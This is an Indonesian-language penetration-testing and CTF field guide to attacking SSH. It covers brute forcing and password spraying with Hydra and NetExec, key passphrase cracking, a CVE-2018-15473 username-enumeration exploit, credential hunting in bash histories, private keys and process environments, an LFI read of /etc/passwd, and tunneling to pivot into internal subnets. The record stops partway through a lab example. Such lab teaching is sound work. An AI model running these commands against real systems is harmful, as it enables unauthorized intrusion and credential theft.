---
id: "06"
title: "06. SSH Exploitation & Tunneling Workflow — Master Field Guide"
category: "2. Network Services"
categoryId: "network"
filename: "06_ssh_workflow.md"
refs_out: ["04","05","07","14a","14b","14c","15","16","24","44","47","64"]
refs_in: ["04","05","07","08","09","10","11","12","13","14a","14b","14c","14d","15","17","17a","17b","17c","18","19","20","21","22","23","24","25","26","35","36","37","41","42","44","53","54","58","61","62","63","64"]
---

# 06. SSH Exploitation & Tunneling Workflow — Master Field Guide

```text
==================================================================================
DOCUMENTATION TYPE : Service Exploitation & Post-Foothold Workflow
SERVICE TARGET     : Secure Shell (SSH)
DEFAULT PORTS      : TCP 22 (Standard), TCP 2222 / 22022 (Common Alt Ports)
TARGET AUDIENCE    : Penetration Testers, CTF Players (HTB / THM / Proving Grounds)
PLATFORM CONTEXT   : Parrot OS XFCE / Debian CLI
PREREQUISITES      : [04. Service Identification & Master Decision Tree — Pentest GPS Navigator](/docs/service-identification-decision-tree), [05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba)
==================================================================================
```

---

## 🧠 BAGIAN 1: SSH FUNDAMENTALS

### 1.1 Apa itu SSH? (Analogi Jalur Pipa Baja Terenkripsi)

**Secure Shell (SSH)** adalah protokol administrasi remote terenkripsi berbasis kriptografi kunci publik yang menggantikan protokol legacy seperti Telnet dan R-Services (rlogin/rsh) yang mengirim data secara teks polos (*plaintext*).

```text
+=============================================================================+
|                      ANALOGI JALUR PIPA BAJA TERENKRIPSI                    |
+=============================================================================+
|                                                                             |
|  [ TELNET (LEGACY / TIDAK AMAN) ]                                           |
|  Attacker/Sniffer ──> Melihat username & password melintas di kabel         |
|                       seperti tulisan di selembar kaca bening.              |
|                                                                             |
|  [ SSH (MODERN / TERENKRIPSI) ]                                             |
|  Client ═══════════════════════════════════════════════════════> Server     |
|         └── Seluruh traffic (keystrokes, output, file, port)                |
|             dibungkus di dalam "pipa baja anti-sadap" (AES/ChaCha20).       |
|             Penyadap hanya melihat deretan byte acak terenkripsi.           |
+=============================================================================+
```

---

### 1.2 Password Authentication vs. Key-Based Authentication

```text
+----------------------+------------------------------------------------------+
| Metode Autentikasi   | Mekanisme & Karakteristik Keamanan                   |
+----------------------+------------------------------------------------------+
| Password Auth        | Mengirim password terenkripsi ke server. Rentan      |
|                      | terhadap dictionary attack & password spraying.      |
+----------------------+------------------------------------------------------+
| Public-Key Auth      | Server mengirim challenge data acak. Klien           |
| (id_rsa / id_ed25519)| menandatangani data tersebut dengan Private Key.     |
|                      | Tidak ada password yang dikirim ke server. Jauh      |
|                      | lebih aman dan kebal terhadap brute force online.    |
+----------------------+------------------------------------------------------+
```

---

### 1.3 Anatomi SSH Private Key

Kunci SSH selalu terdiri dari sepasang (*key pair*):
1. **Public Key (`id_rsa.pub` / `authorized_keys`)**: Kunci publik yang disimpan di server pada file `~/.ssh/authorized_keys`. Boleh diketahui publik.
2. **Private Key (`id_rsa` / `id_ed25519`)**: Kunci privat yang **HANYA** disimpan oleh pemiliknya. Jika kunci ini bocor, siapa pun bisa login sebagai user tersebut.

```text
+-------------------+---------------------------------------------------------+
| Tipe Algoritma    | Header File & Karakteristik                             |
+-------------------+---------------------------------------------------------+
| RSA (Legacy/Std)  | -----BEGIN RSA PRIVATE KEY----- (PKCS#1)                |
|                   | Ukuran 2048 - 4096 bit. Standar lama yang sering ada di |
|                   | CTF mesin lawas.                                        |
+-------------------+---------------------------------------------------------+
| OpenSSH Modern    | -----BEGIN OPENSSH PRIVATE KEY-----                     |
| (Ed25519 / RSA)   | Format standar OpenSSH 6.5+. Ed25519 (Elliptic Curve)   |
|                   | sangat pendek, cepat, dan aman.                         |
+-------------------+---------------------------------------------------------+
```

* **Passphrase**: Password tambahan yang digunakan untuk mengenkripsi private key di disk lokal. Jika key memiliki passphrase, kunci tersebut tidak bisa digunakan langsung sebelum passphrase di-crack/dimasukkan.

---

### 1.4 Kenapa Izin File `id_rsa` HARUS `600`? (Analogi Kunci Brankas)

> **Analogi Kunci Brankas:**  
> Jika Anda meletakkan kunci brankas rahasia di atas meja kerja terbuka di mana semua rekan kantor bisa menyalinnya (*Permission 777 atau 644*), kunci tersebut dianggap tidak lagi aman oleh OpenSSH client.

OpenSSH client secara ketat menolak menghubungkan sesi jika file private key dapat dibaca oleh user lain di sistem operasi lokal Anda:
```text
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
```
* **Solusi Wajib**: Selalu jalankan `chmod 600 id_rsa` (Read/Write hanya untuk user pemilik).

---

### 1.5 Apa itu `known_hosts`?

File `~/.ssh/known_hosts` menyimpan fingerprint kunci publik host server yang pernah Anda hubungi. 
* **Masalah di Lingkungan CTF**: Saat Anda mereset mesin CTF atau memainkan mesin baru dengan IP yang sama (misal IP Lab `10.10.10.x`), fingerprint server berubah dan SSH menolak koneksi (*HOST IDENTIFICATION HAS CHANGED*).
* **Solusi Pentest**: Nonaktifkan validasi host key dengan opsi `-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null`.

---

### 1.6 Perbedaan SSH-1 vs SSH-2

* **SSH-1 (Legacy / Usang)**: Memiliki cacat desain kriptografi serius (CRC-32 compensation attack, Man-in-the-Middle). Sudah dimatikan secara default di semua OS modern.
* **SSH-2**: Protokol standar modern dengan Diffie-Hellman Key Exchange dan enkripsi integritas MAC yang kuat.

---

### 1.7 Cara Membaca SSH Banner

Banner SSH membocorkan informasi sistem operasi dan versi daemon secara eksplisit:

```text
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
│   │   │              │
│   │   │              └── Distribusi OS: Ubuntu 20.04 LTS (Focal Fossa)
│   │   └── Versi Software: OpenSSH 8.2 Portable Release 1
│   └── Versi Protokol: SSH Protocol 2.0
```
* **Keuntungan Pentester**: Dari banner di atas, Anda langsung tahu:
  1. Target adalah Linux Ubuntu 20.04.
  2. Direktori web default adalah `/var/www/html`.
  3. Konfigurasi Apache ada di `/etc/apache2/`.
  4. User default biasanya `ubuntu` atau user lokal non-root.

---

## 🛠️ BAGIAN 2: TOOL ARSENAL SSH

```text
=======================================================================================================
TOOL               FUNGSI UTAMA                    KECEPATAN   PENGGUNAAN UTAMA
=======================================================================================================
ssh                Client Terminal Interaktif      Realtime    Remote shell login & Tunneling
nxc (NetExec) ssh  Credential Spraying & Audit     Sangat Cepat Validasi massal user & password
hydra              Online Password Brute Force     Cepat       Bruteforce password via network
medusa             Alternatif Multi-Thread Hydra   Cepat       Parallel dictionary attack
ssh-keyscan        Host Key Harvester              Sangat Cepat Mengambil public key target
john / ssh2john    Offline Passphrase Cracker      Cepat       Crack password id_rsa via CPU
hashcat            GPU Accelerated Cracker         Ekstrem     Crack password id_rsa via GPU
=======================================================================================================
```

---

### 2.1 `ssh` — Standard OpenSSH Client
* **Fungsi**: Terminal remote client untuk eksekusi perintah dan pembentukan tunnel proxy.
* **Flag Paling Penting**:
  * `-i <file>` : Menentukan file identity (Private Key).
  * `-p <port>` : Menentukan port target non-standard (misal: `-p 2222`).
  * `-o StrictHostKeyChecking=no` : Mengabaikan prompt konfirmasi fingerprint server.
  * `-o UserKnownHostsFile=/dev/null` : Mencegah error fingerprint bentrok di file `known_hosts`.
  * `-L / -R / -D` : Opsi port forwarding dan SOCKS5 tunneling.

```bash
# Login menggunakan private key tanpa peringatan fingerprint
ssh -i id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@10.10.11.200
```

---

### 2.2 `nxc` (NetExec) SSH — Credential Spraying & Validation
* **Fungsi**: Menguji sepasang username/password terhadap daemon SSH tanpa membuka sesi interaktif satu per satu.
* **Kapan Digunakan**: Menguji list username hasil dumping web/SMB terhadap list password default.

```bash
# Validasi list user dan password dengan auto-continue saat sukses
nxc ssh 10.10.11.200 -u users.txt -p passwords.txt --continue-on-success
```

* **Contoh Output Nyata**:
```text
SSH         10.10.11.200    22     10.10.11.200     [-] user:Password123 Failed authentication
SSH         10.10.11.200    22     10.10.11.200     [+] jordan:P@ssw0rd2024! (Pwn3d!)
```

---

### 2.3 `hydra` — Online Password Bruteforce
* **Fungsi**: Melakukan brute force password secara paralel.
* **Flag Penting**:
  * `-l <user>` / `-L <user_list>` : Username tunggal atau file list user.
  * `-p <pass>` / `-P <pass_list>` : Password tunggal atau file wordlist (`rockyou.txt`).
  * `-t 4` : Batasi thread ke 4 (SSH server default sering memblokir lebih dari 4-6 koneksi simultan!).
  * `-f` : Berhenti seketika saat password valid pertama ditemukan.

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.11.200 ssh -t 4 -f
```

---

### 2.4 `ssh2john` & `john` — Offline SSH Key Passphrase Cracker
* **Fungsi**: Mengubah private key ber-passphrase menjadi format hash John, lalu memecahkannya secara offline.

```bash
# 1. Konversi key ke format hash
ssh2john id_rsa > id_rsa.hash

# 2. Crack menggunakan wordlist rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

---

## 🎯 BAGIAN 3: WORKFLOW UTAMA (STEP BY STEP)

```bash
# Setup Environment Variable Target di Terminal Parrot OS:
export TARGET="10.10.11.200"
echo "Target SSH set to: $TARGET"
```

---

### FASE 1: BANNER GRABBING & SERVICE FINGERPRINT

**Tujuan**: Mengidentifikasi versi daemon OpenSSH, algoritma kriptografi yang didukung, serta metode autentikasi yang diizinkan server.

```bash
# 1. Raw Banner Grabbing via Netcat
nc -vn -w 3 $TARGET 22

# 2. Detail Nmap Service & OS Discovery
nmap -sV -p 22 $TARGET

# 3. Enumerasi Algoritma Pertukaran Kunci & Cipher (Sangat penting untuk deteksi legacy)
nmap -p 22 --script ssh2-enum-algos $TARGET

# 4. Deteksi Metode Autentikasi yang Didukung (Password vs Publickey)
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" $TARGET

# 5. Ekstraksi Host Keys Publik
ssh-keyscan -t rsa,ecdsa,ed25519 $TARGET
```

* **Contoh Output Nyata `ssh-auth-methods`**:
```text
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
```
* **Cara Membaca Output**:
  * Jika output **HANYA** `publickey`: Server mematikan password login! Jangan buang waktu melakukan bruteforce Hydra. Anda **wajib** mencari file `id_rsa` di web, SMB, backup, atau LFI.
  * Jika muncul `password`: Anda bisa menggunakan username + password hasil looting atau password spray.

---

### FASE 2: KONEKSI DENGAN PRIVATE KEY (`id_rsa`)

**Tujuan**: Menggunakan file private key yang ditemukan dari SMB share, web backup, LFI, atau FTP.

```bash
# 1. Pastikan hak akses file private key disetel ke 600 (WAJIB!)
chmod 600 id_rsa

# 2. Hubungkan ke target menggunakan key
ssh -i id_rsa user@$TARGET

# 3. Perintah anti-hang (mengabaikan prompt fingerprint & known_hosts)
ssh -i id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@$TARGET
```

#### Cara Menebak Username Jika Tidak Diketahui:
1. **Periksa Baris Terakhir File `id_rsa.pub` atau `authorized_keys`**:
   ```bash
   tail -n 1 id_rsa.pub
   # Output: ssh-rsa AAAAB3NzaC1yc2E... jordan@megacorp.local  <-- Username: jordan
   ```
2. **Coba Username Standar**: `root`, `admin`, `ubuntu`, `debian`, `kali`, `user`, atau nama mesin target (misal: target `monitor.htb` ➔ user `monitor`).

---

### FASE 3: KONEKSI DENGAN PASSWORD

```bash
# 1. Koneksi standar dengan password
ssh username@$TARGET

# 2. Koneksi ke port custom (misal: Port 2222 atau 22022)
ssh -p 2222 username@$TARGET

# 3. Bypass error konfirmasi Host Key Verification
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 username@$TARGET
```

---

### FASE 4: LEGACY SSH CONNECTION BYPASS (WAJIB DIKUASAI DI CTF)

Di lab CTF (HackTheBox / TryHackMe mesin legacy), Anda akan sering menjumpai server OpenSSH versi lama (OpenSSH 4.x / 5.x / 6.x) yang menggunakan algoritma cipher atau pertukaran kunci yang sudah dihapus/dinonaktifkan oleh OpenSSH versi baru di Parrot OS.

#### 🔴 Error 1: "no matching key exchange method found"
```text
Unable to negotiate with 10.10.11.200 port 22: no matching key exchange method found.
Their offer: diffie-hellman-group1-sha1,diffie-hellman-group14-sha1
```
* **Solusi**: Tambahkan flag `-o KexAlgorithms=+diffie-hellman-group1-sha1`

#### 🔴 Error 2: "no matching host key type found"
```text
Unable to negotiate with 10.10.11.200 port 22: no matching host key type found.
Their offer: ssh-rsa,ssh-dss
```
* **Solusi**: Tambahkan flag `-o HostKeyAlgorithms=+ssh-rsa`

#### 🔴 Error 3: "no matching cipher found"
```text
Unable to negotiate with 10.10.11.200 port 22: no matching cipher found.
Their offer: aes128-cbc,3des-cbc,blowfish-cbc
```
* **Solusi**: Tambahkan flag `-c +aes128-cbc,3des-cbc`

#### 🌟 Template All-in-One Koneksi Mesin Legacy / Ultra Old Box:
```bash
ssh -i id_rsa \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 \
  -o HostKeyAlgorithms=+ssh-rsa,ssh-dss \
  -o PubkeyAcceptedKeyTypes=+ssh-rsa \
  -c +aes128-cbc,3des-cbc \
  user@$TARGET
```

---

### FASE 5: SSH KEY PASSPHRASE CRACKING

Jika saat login muncul prompt: `Enter passphrase for key 'id_rsa':`, berarti private key tersebut diproteksi oleh passphrase lokal.

```bash
# 1. Konversi private key ke format hash John
ssh2john id_rsa > id_rsa.hash

# 2. Crack menggunakan John the Ripper (CPU)
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

# 3. Tampilkan password yang berhasil di-crack
john --show id_rsa.hash
```

* **Contoh Output Nyata John**:
```text
id_rsa:starwars:id_rsa:id_rsa::id_rsa
1 password hash cracked, 0 left
```
* **Password Passphrase**: `starwars`.

```bash
# 4. Alternatif Cracking Menggunakan Hashcat (GPU)
# Cek format header private key terlebih dahulu:
head -n 1 id_rsa

# A. Jika header: -----BEGIN RSA PRIVATE KEY----- (Legacy RSA PKCS#1):
# Gunakan Hashcat Mode 22921 (RSA / PKCS#1 Private Key)
hashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt --force

# B. Jika header: -----BEGIN OPENSSH PRIVATE KEY----- (Modern OpenSSH bcrypt KDF):
# Gunakan Hashcat Mode 22931 (OpenSSH Private Key bcrypt)
hashcat -m 22931 id_rsa.hash /usr/share/wordlists/rockyou.txt --force

# 5. Gunakan ssh-agent agar tidak perlu mengetik passphrase berulang kali
eval $(ssh-agent)
ssh-add id_rsa
# Masukkan passphrase 'starwars' satu kali, lalu login langsung bebas password:
ssh user@$TARGET
```

---

### FASE 6: SSH ONLINE BRUTEFORCE (KAPAN REALISTIS?)

> [!WARNING]
> Di dunia nyata dan lab modern, OpenSSH dilindungi oleh `fail2ban` (IP diblokir setelah 3-5 kali gagal). Bruteforce hanya realistis di CTF kategori *Easy/Introductory* atau ketika wordlist username & password sangat terarah dan kecil (< 100 baris).

```bash
# 1. Single User Bruteforce via Hydra (Maksimal 4 Thread)
hydra -l jordan -P /usr/share/wordlists/rockyou.txt $TARGET ssh -t 4 -f

# 2. Multi-User Targeted Spraying via NetExec
nxc ssh $TARGET -u users.txt -p passwords.txt --continue-on-success

# 3. Alternatif menggunakan Medusa
medusa -h $TARGET -u jordan -P /usr/share/wordlists/rockyou.txt -M ssh -t 4 -f
```

---

### FASE 7: POST-CONNECTION ENUMERATION (SETELAH MENDAPATKAN SHELL)

Segera setelah prompt shell terbuka (`user@target:~$`), jalankan checklist perintah wajib berikut:

```bash
# 1. Identitas & Hak Akses
whoami                     # KENAPA: Konfirmasi username aktif saat ini
id                         # KENAPA: Cek grup sensitif (sudo, docker, lxd, adm, disk)

# 2. Kernel & Arsitektur OS
uname -a                   # KENAPA: Versi kernel Linux untuk pencarian Kernel Exploit
cat /etc/os-release        # KENAPA: Mengetahui distro (Ubuntu/Debian/CentOS/Alpine)
hostname                   # KENAPA: Cek nama node / peran server

# 3. User & Akun Interaktif
cat /etc/passwd | grep -v "nologin\|false" # KENAPA: Mengetahui user lain yang memiliki shell

# 4. Konfigurasi Jaringan & Interface Internal
ip a                       # KENAPA: Cek apakah target terhubung ke subnet internal lain (Dual-NIC)

# 5. Service Internal yang Mendengarkan (Hidden Ports / Localhost Only)
ss -tlnp                   # KENAPA: Menemukan database/web yang hanya buka di 127.0.0.1
# Alternatif jika ss tidak ada: netstat -tlnp

# 6. Running Process
ps aux | grep root         # KENAPA: Melihat service/script root yang berjalan di background

# 7. Sudo Privileges (PRIORITAS NOMOR 1!)
sudo -l                    # KENAPA: Cek apakah user boleh menjalankan perintah root tanpa password!

# 8. SUID Binaries (File dengan hak root bawaan)
find / -perm -u=s -type f 2>/dev/null # KENAPA: Mencari custom SUID binary di GTFOBins

# 9. Home Directory, Shell History & User Flag
ls -la /home/              # KENAPA: Cek isi home folder user lain
ls -la ~/                  # KENAPA: Cek file tersembunyi (.bash_history, .ssh, .viminfo)
cat ~/user.txt             # KENAPA: Ambil CTF user flag!
cat ~/.bash_history 2>/dev/null # KENAPA: Sering menyimpan password mysql/sudo/ssh dari admin sebelumnya!
```

---

#### 🔍 BONUS: CREDENTIAL HUNTING & QUICK WINS SETELAH LOGIN

Setelah mendapatkan shell SSH awal, jalankan perintah pencarian cepat berikut untuk berburu kredensial sensitif atau jalur privilege escalation:

```bash
# 1. Bash History — Goldmine Kredensial & Perintah Rahasia
cat ~/.bash_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
find / -name ".bash_history" 2>/dev/null -exec cat {} \;
history

# 2. Kunci SSH & Konfigurasi User Lain
find /home -name "id_rsa" 2>/dev/null
find /home -name "authorized_keys" 2>/dev/null
find /home -name ".ssh" -type d 2>/dev/null

# 3. Scheduled Tasks / Cron Jobs yang Berjalan Sebagai Root
cat /etc/crontab
ls -la /etc/cron*
crontab -l 2>/dev/null

# 4. File Milik Root yang Bisa Ditulis oleh User Kita (Writable Files)
find / -writable -user root -type f 2>/dev/null | grep -v "/proc" | grep -v "/sys"

# 5. Environment Variables & Process Secrets
env | grep -iE "pass|secret|key|token"
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -iE "pass|secret|token"
```

---

### FASE 8: SSH PORT FORWARDING & TUNNELING

SSH tunneling adalah teknik memanfaatkan koneksi SSH terenkripsi untuk merutekan traffic jaringan menuju service internal target yang tidak terbuka ke internet.

```text
+=============================================================================+
|                        SSH TUNNELING TAXONOMY                               |
+=============================================================================+
|                                                                             |
|  1. LOCAL PORT FORWARDING (-L)                                              |
|     Membawa service remote di target (127.0.0.1:3306) ke port lokal Anda.   |
|                                                                             |
|  2. REMOTE PORT FORWARDING (-R)                                             |
|     Mengekspos port di mesin lokal Anda ke dalam jaringan target.           |
|                                                                             |
|  3. DYNAMIC SOCKS5 PROXY (-D)                                               |
|     Membuka proxy SOCKS5 penuh untuk mengakses SELURUH subnet internal.     |
+=============================================================================+
```

---

#### 1. Local Port Forwarding (`-L`)
* **Use Case**: Target memiliki database MySQL (`127.0.0.1:3306`) atau Web Dashboard internal (`127.0.0.1:8080`) yang tidak bisa diakses langsung dari IP publik.

```bash
# Syntax: ssh -L [LOCAL_PORT]:127.0.0.1:[REMOTE_PORT] user@$TARGET -N -f
# -N = Jangan spawn interactive shell (hanya forward port)
# -f = Jalankan proses SSH di background

# Contoh: Forward web internal 8080 di target ke port 9090 mesin Parrot OS Anda:
ssh -L 9090:127.0.0.1:8080 user@$TARGET -N -f

# Verifikasi koneksi dari mesin lokal Anda:
curl -I http://127.0.0.1:9090/
# Buka browser Parrot OS Anda di: http://127.0.0.1:9090
```

---

#### 2. Remote Port Forwarding (`-R`)
* **Use Case**: Anda ingin mengirim reverse shell dari mesin ketiga di jaringan internal ke port listener Netcat di mesin Parrot OS Anda, tetapi mesin ketiga tidak bisa merutekan IP ke VPN Anda secara langsung.

```bash
# Syntax: ssh -R [PORT_DI_TARGET]:127.0.0.1:[PORT_LISTENER_LOKAL] user@$TARGET -N -f

# Contoh: Buka port 4444 di target yang meneruskan koneksi ke listener Netcat port 4444 lokal Anda:
ssh -R 4444:127.0.0.1:4444 user@$TARGET -N -f
```

---

#### 3. Dynamic Port Forwarding (`-D`) & Proxychains (SOCKS5 Proxy)
* **Use Case**: Merutekan seluruh tool pentest Anda (Nmap, FFUF, Burp Suite, Browser, NetExec) agar bisa memindai seluruh subnet internal target (`172.16.0.0/24` atau `192.168.100.0/24`).

```bash
# 1. Buka SOCKS5 Proxy di port lokal 1080
ssh -D 1080 -N -f user@$TARGET

# 2. Konfigurasi /etc/proxychains4.conf di Parrot OS Anda:
# Pastikan baris terakhir berisi: socks5 127.0.0.1 1080
sudo bash -c "grep -q 'socks5 127.0.0.1 1080' /etc/proxychains4.conf || echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf"

# 3. Eksekusi tool melalui proxychains:
proxychains nmap -sT -Pn -p 80,445,3389 172.16.1.10
proxychains curl -s http://172.16.1.10/
```

---

## 🌳 BAGIAN 4: DECISION TREE LENGKAP

```text
                          [PORT 22 (SSH) TERBUKA]
                                     │
                 ┌───────────────────┴───────────────────┐
                 │                                       │
     [FINGERPRINTING & BANNER]               [AUTHENTICATION METHODS]
     nc -vn $TARGET 22                       nmap --script ssh-auth-methods
                 │                                       │
                 ▼                                       ▼
     [OpenSSH Version Check]                 [Supported Auth: ?]
     - Modern OpenSSH (>= 7.7)               ├── "publickey only" ──> Cari id_rsa di Web/SMB/LFI
     - Legacy OpenSSH (<= 6.x)               └── "password enabled" ──> Siapkan User & Pass Spray
                 │
                 ▼
     [APAKAH PUNYA KREDENSIAL / PRIVATE KEY?]
                 │
   ┌─────────────┴─────────────────────────────────────┐
   │                                                   │
[YES: PUNYA PRIVATE KEY]                    [YES: PUNYA PASSWORD]
   │                                                   │
chmod 600 id_rsa                                       │
ssh -i id_rsa user@$TARGET                             │
   │                                                   │
   ├── Prompt Passphrase?                              │
   │      └── YES ──> ssh2john ➔ john rockyou.txt      │
   │                                                   │
   ├── Error: "no matching key/host"?                  │
   │      └── YES ──> Tambahkan flag Legacy Bypass     │
   │                  -o KexAlgorithms=+diffie-hellman │
   │                  -o HostKeyAlgorithms=+ssh-rsa    │
   │                                                   │
   └── [BERHASIL MASUK KE SHELL] ◄─────────────────────┘
                 │
                 ▼
   [FASE 7: POST-CONNECTION ENUMERATION]
   ├── whoami; id; uname -a
   ├── sudo -l (Cek GTFOBins)
   ├── find / -perm -u=s (SUID Binaries)
   └── ss -tlnp (Cek Localhost Only Ports)
                 │
                 ▼
   [APAKAH ADA SERVICE INTERNAL (127.0.0.1)?]
   ├── YES ──> Buka SSH Tunneling:
   │            ├── Single Service ──> Local Port Forwarding (ssh -L)
   │            └── Entire Subnet  ──> SOCKS5 Proxychains (ssh -D 1080)
   └── NO  ──> Lanjutkan ke Linux Privilege Escalation (Modul 44)
```

---

## 🔍 BAGIAN 5: USERNAME ENUMERATION TANPA CREDENTIALS

Jika Anda memiliki private key tetapi tidak tahu username pemiliknya, atau ingin menyusun `users.txt` untuk password spray, gunakan sumber data berikut:

```text
+=============================================================================+
|                      SSH USERNAME HARVESTING PIPELINE                       |
+=============================================================================+
```

1. **Dari Public Key / `authorized_keys`**:
   Format string baris SSH public key selalu diakhiri dengan comment:
   `ssh-rsa AAAAB3NzaC1... [username]@[hostname]` ➔ Username ada di bagian akhir.
2. **Dari File `/etc/passwd` (Melalui LFI atau Web Directory Traversal)**:
   ```bash
   curl "http://$TARGET/view.php?file=/etc/passwd" | grep -v "nologin\|false" | cut -d: -f1
   ```
3. **Dari Aplikasi Web**:
   * Nama author postingan blog (WordPress `/wp-json/wp/v2/users`).
   * Username di URL profile (`/user/profile.php?id=jordan`).
4. **Dari Alamat Email Kontak Perusahaan**:
   `jordan.belfort@corp.htb` ➔ Format username umum: `jordan`, `jbelfort`, `jordanb`, `belfortj`.
5. **Dari Hostname Mesin**:
   Jika hostname mesin adalah `jordan-dev`, sering kali username utamanya adalah `jordan`.
6. **OpenSSH Username Enumeration (CVE-2018-15473)**:
   Pada OpenSSH versi < 7.7, server merespon request autentikasi user yang valid dan tidak valid dalam selisih waktu paket / respons error yang berbeda (*timing & response discrepancy*).

```bash
# A. Menggunakan Exploit Script Khusus (Paramiko-based):
git clone https://github.com/Rhynorater/CVE-2018-15473-Exploit /tmp/cve-2018-15473
python3 /tmp/cve-2018-15473/sshUsernameEnumExploit.py --userList /usr/share/seclists/Usernames/top-usernames-shortlist.txt $TARGET

# B. Observasi Manual via Timing / Error Discrepancy:
# User Valid   ➔ Server mengembalikan respon "Permission denied (publickey)"
# User Invalid ➔ Server langsung memutus koneksi atau memiliki selisih waktu handshake lebih lama
ssh -o StrictHostKeyChecking=no jordan@$TARGET 2>&1 | head -n 5
```

---

## 🔧 BAGIAN 6: COMMON ERRORS & TROUBLESHOOTING (12+ ERROR SOLUTIONS)

### 1. `Permission denied (publickey)`
* **Pesan Error**: `user@10.10.11.200: Permission denied (publickey).`
* **Penyebab**: Username salah, file `authorized_keys` di target tidak berisi pasangan public key Anda, atau server menonaktifkan login password dan key Anda ditolak.
* **Solusi CLI**: Periksa username dengan opsi verbose:
```bash
ssh -vvv -i id_rsa user@$TARGET
```

---

### 2. `Permission denied (publickey,password)`
* **Pesan Error**: `user@10.10.11.200: Permission denied (publickey,password).`
* **Penyebab**: Password yang dimasukkan salah atau akun dinonaktifkan.
* **Solusi CLI**: Coba password spraying dengan user lain atau cari password baru dari database web.

---

### 3. `WARNING: UNPROTECTED PRIVATE KEY FILE!`
* **Pesan Error**: `Permissions 0644 for 'id_rsa' are too open. This private key will be ignored.`
* **Penyebab**: Hak akses file `id_rsa` terlalu longgar (*world-readable*).
* **Solusi CLI**:
```bash
chmod 600 id_rsa
```

---

### 4. `no matching key exchange method found`
* **Pesan Error**: `Unable to negotiate with 10.10.11.200: no matching key exchange method found. Their offer: diffie-hellman-group1-sha1`
* **Penyebab**: Target menggunakan algoritma pertukaran kunci lawas yang dinonaktifkan di OpenSSH modern.
* **Solusi CLI**:
```bash
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 user@$TARGET
```

---

### 5. `no matching host key type found`
* **Pesan Error**: `Unable to negotiate with 10.10.11.200: no matching host key type found. Their offer: ssh-rsa`
* **Penyebab**: Target menggunakan signature algoritma host key SHA-1 (RSA lama).
* **Solusi CLI**:
```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa user@$TARGET
```

---

### 6. `Connection refused`
* **Pesan Error**: `ssh: connect to host 10.10.11.200 port 22: Connection refused`
* **Penyebab**: Port 22 ditutup, firewall memblokir IP, atau SSH dipindahkan ke port non-standard (misal: 2222, 22022).
* **Solusi CLI**: Cek hasil scan full port nmap Anda:
```bash
nmap -p- --min-rate 2000 -Pn $TARGET
```

---

### 7. `Connection timed out`
* **Pesan Error**: `ssh: connect to host 10.10.11.200 port 22: Connection timed out`
* **Penyebab**: Target mati, IP VPN terputus, atau paket SYN di-drop oleh firewall.
* **Solusi CLI**: Verifikasi koneksi VPN dan jalankan `ping -c 2 $TARGET`.

---

### 8. `Host key verification failed!`
* **Pesan Error**: `IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY! Host key verification failed.`
* **Penyebab**: Fingerprint server target telah berubah dari data lama yang tercatat di `~/.ssh/known_hosts`.
* **Solusi CLI**:
```bash
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@$TARGET
```

---

### 9. `Too many authentication failures`
* **Pesan Error**: `Received disconnect from 10.10.11.200: 2: Too many authentication failures`
* **Penyebab**: SSH client lokal Anda otomatis mencoba semua private key yang ada di folder `~/.ssh/` Anda sebelum mencoba password, sehingga batas percobaan autentikasi server habis.
* **Solusi CLI**: Paksa SSH hanya menggunakan metode password:
```bash
ssh -o PubkeyAuthentication=no user@$TARGET
```

---

### 10. `ssh_exchange_identification: read: Connection reset by peer`
* **Penyebab**: IP Anda diblokir oleh TCP Wrappers (`/etc/hosts.deny`) atau `fail2ban`.
* **Solusi CLI**: Ganti IP tun0 VPN Anda (reconnect openvpn) atau tunggu masa lockout berakhir.

---

### 11. `Unable to negotiate (Cipher / MAC Error)`
* **Pesan Error**: `Unable to negotiate with 10.10.11.200: no matching cipher found. Their offer: 3des-cbc`
* **Solusi CLI**:
```bash
ssh -c +3des-cbc user@$TARGET
```

---

### 12. `Could not resolve hostname`
* **Pesan Error**: `ssh: Could not resolve hostname target.htb: Name or service not known`
* **Penyebab**: Domain host belum didaftarkan ke `/etc/hosts`.
* **Solusi CLI**:
```bash
echo "$TARGET target.htb" | sudo tee -a /etc/hosts
```

---

## 🏆 BAGIAN 7: REAL CTF EXAMPLES

---

### 📝 EXAMPLE 1: `id_rsa` dari Anonymous FTP ➔ Passphrase Cracking ➔ SSH User Shell

**Target**: Linux Box (HTB Permutation)

#### Step 1: Menemukan Key dari FTP & Verifikasi
```bash
ftp -n $TARGET <<EOF
user anonymous anonymous
get id_rsa
quit
EOF

chmod 600 id_rsa
ssh -i id_rsa -o StrictHostKeyChecking=no jordan@$TARGET
```
* **Output**: `Enter passphrase for key 'id_rsa':` (Key terkunci!).

#### Step 2: Cracking Passphrase via John the Ripper
```bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```
